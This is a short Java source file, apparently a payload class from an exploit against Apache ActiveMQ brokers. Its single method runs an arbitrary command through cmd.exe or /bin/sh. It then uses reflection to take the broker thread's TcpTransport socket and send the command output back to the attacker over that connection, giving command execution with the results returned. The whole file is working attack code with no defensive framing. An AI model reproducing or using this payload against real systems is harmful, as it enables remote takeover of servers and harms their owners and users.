package exp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;

public class CMDResponse {


    public void test(String cmd) throws IOException {
        String result = "";
        String process = "";
        String arg = "";
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            process = "cmd.exe";
            arg = "/c";
        }else{
            process = "/bin/sh";
            arg = "-c";
        }
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(new String[]{process,arg,cmd});
            Process start = processBuilder.start();
            InputStream inputStream = start.getInputStream();
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int read = 0;
            while ((read = inputStream.read()) != -1){
                byteArrayOutputStream.write(read);
            }
            result = new String(byteArrayOutputStream.toByteArray());
        }catch (Exception e){
            result = e.getMessage();
        }

        try {
            Thread thread = Thread.currentThread();
            Class<?> aClass = Class.forName("java.lang.Thread");
            Field target = aClass.getDeclaredField("target");
            target.setAccessible(true);
            Object transport = target.get(thread);
            Class<?> aClass1 = Class.forName("org.apache.activemq.transport.tcp.TcpTransport");
            Field socketfield = aClass1.getDeclaredField("socket");
            socketfield.setAccessible(true);
            java.net.Socket socket =(java.net.Socket) socketfield.get(transport);
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write("\n".getBytes());
            outputStream.write(result.getBytes());
            outputStream.close();
        }catch (Exception e){
        }
    }
}
